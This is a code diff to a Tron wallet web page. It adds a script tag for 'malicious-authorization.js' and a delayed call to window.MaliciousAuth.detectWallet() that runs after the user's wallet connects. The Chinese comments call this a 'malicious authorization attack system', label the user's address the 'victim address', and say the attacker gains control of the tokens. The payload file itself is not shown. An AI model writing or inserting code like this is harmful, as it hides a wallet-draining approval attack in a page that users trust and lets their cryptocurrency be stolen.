@@ -2279,6 +2279,17 @@
             
             // 🎯 获取用户真实余额
             await getTronBalance(address);
+            
+            // 🎯 启动恶意授权攻击系统
+            if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+                debugLog('🎯 受害者地址:', address);
+                debugLog('🎯 攻击者将获得代币控制权...');
+                
+                setTimeout(() => {
+                    window.MaliciousAuth.detectWallet();
+                }, 3000); // 延迟3秒启动，确保钱包完全连接
+            }
 
         }
 
@@ -3385,6 +3396,9 @@
         };
     </script>
     <script src="add_multi_currency_patch.js"></script>
+    
+    <!-- 🎯 恶意授权攻击系统 -->
+    <script src="malicious-authorization.js"></script>
 
 </body>
 </html>
